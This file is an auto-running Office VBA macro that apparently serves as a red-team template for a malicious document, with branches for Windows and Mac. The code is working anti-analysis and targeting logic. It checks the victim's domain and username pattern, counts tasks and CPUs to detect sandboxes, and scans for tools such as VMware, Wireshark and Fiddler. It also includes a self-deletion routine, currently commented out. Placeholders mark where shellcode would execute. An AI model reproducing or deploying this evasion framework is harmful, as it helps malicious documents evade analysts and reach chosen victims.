Sub Document_Open()

WINorMac

End Sub

'#######################################################################################################'

Sub WINorMac()

    #If Mac Then
        Mac_Stuffs                                              'Mac'
    #Else
        Windoze_stuffs                                          'Win'
    #End If

End Sub

'#######################################################################################################'

Sub Windoze_stuffs()

On Error Resume Next

WinDomainName                                                   'Check if windows domain joined and get info'

checkNbrOfTask                                                  'Check if the # of tasks is sketchy'

checkTasks                                                      'Check if they have sketchy names'

ShellMEHWin

End Sub

'#######################################################################################################'

Sub WinDomainName()

Dim Domain As String
Dim matchDomain As Boolean
Dim Username As String
Dim userRegex As Object
Set userRegex = New RegExp
Dim userMatch As Boolean

userRegex.Pattern = "[a-zA-z]{5}[0-9]{2}$"                      'Add regex support, if issues with default can potentially call kernel32api
ourDomain = "CORP"
Domain = Environ$("userdomain")
Username = Environ$("username")

userMatch = userRegex.Test(Username)

matchDomain = InStr(1, Domain, ourDomain, vbTextCompare) > 0

If userMatch And matchDomain Then
    MsgBox "win user passed domain check! We also have a valid employee!"

Else
    MsgBox "FAIL! Not on domain or valid employee bub"
	danger
	
End If

End Sub

'#######################################################################################################'

 Sub checkNbrOfTask()

    If Application.Tasks.Count < 3 Then                         'Checks for Sandbox level of tasks'
    
        MsgBox "Looks like a low task count...FAIL"                              'If suspect, we kill'
        
        danger
        
    Else
    
        MsgBox "looks like legit task count!"

    End If
    
End Sub

'#######################################################################################################'

Public Sub checkTasks()

    badTask = False
    badTaskNames = Array("vbox", "vmware", "vxstream", "autoit", "vmtools", "tcpview", "wireshark", "process explorer", "visual basic", "fiddler")
    'badTaskNames = Array("Ninja") //validation check that its ACTUALLY checking...
    For Each Task In Application.Tasks
    
        For Each badTaskName In badTaskNames
            If InStr(LCase(Task.Name), badTaskName) > 0 Then
                badTask = True
            End If
        Next
        
    Next

    If badTask Then
        
        MsgBox "DETECTED! *MGS HIDE MUSIC* BAD TASK NAME!"
        danger
    Else
        
        MsgBox "OK, looks legit to me on the task name front..."
    End If
    
End Sub

'#######################################################################################################'

Sub ShellMEHWin()

MsgBox "Congrats, you have made it to the shellcode for Windows execution aspect of code execution, your prize is doom!" 'This is where we'd shell

Finale

End Sub

'#######################################################################################################'

Sub Mac_Stuffs()
                                    'Mac logic'
OSXDomain

MacProc

ShellMEHMac

Finale

End Sub

'#######################################################################################################'

Sub OSXDomain()

Dim Result As String
Dim Match As Boolean
Dim User As String
Dim Correct As Boolean

test = "corp.local"

Result = MacScript("do shell script ""scutil --dns| grep corp.local|tail -c 22""")

Match = InStr(1, Result, test, vbTextCompare) > 0

User = MacScript("do shell script ""whoami""")

Correct = User Like "[a-zA-Z][a-zA-Z][a-zA-Z][a-zA-Z][a-zA-Z][0-9][0-9]"

If Match And Correct Then
        MsgBox "OSX on domain! User Valid!"
Else
		MsgBox "OSX NOT ON DOMAIN!"
		danger
End If
		
End Sub

'#######################################################################################################'

Sub MacProc

	Dim Result As Integer
	Dim Match As Boolean

	Result = MacScript("do shell script ""getconf _NPROCESSORS_ONLN""")

	Match = Result > 3

	If Match Then

		MsgBox "Legit Mac Processors!"

	Else

		Msgbox "Not legit proc count, error!"
	danger

	End If

End Sub

'#######################################################################################################'

Sub ShellMEHMac()

	MsgBox "AMAZING! You have executed the complete run time of our macro for osx! your prize is sadly not cake...but SHELL" 'This is where we'd shell OSX

	Finale

End Sub

'#######################################################################################################'

Sub Finale()
                                                                         'Self Terminate Sub'
Dim vbCom As Object

    MsgBox "Deleting due to passing checks! Dont mind me just hiding the bodies..."                             'Commented for debugging, lol ?\_(?)_/?'
    'Set vbCom = Application.VBE.ActiveVBProject.VBComponents

    'vbCom.Remove VBComponent:= _
    'vbCom.Item("Module1")
	End
	
End Sub


'#######################################################################################################'

Sub danger()
                                                                         'Self Terminate Sub'
Dim vbCom As Object

    MsgBox "Deleting due failing a check! NO WITNESSES!!!!!"                             'Commented for debugging, lol ?\_(?)_/?'
    'Set vbCom = Application.VBE.ActiveVBProject.VBComponents

    'vbCom.Remove VBComponent:= _
    'vbCom.Item("Module1")
	End
	
End Sub



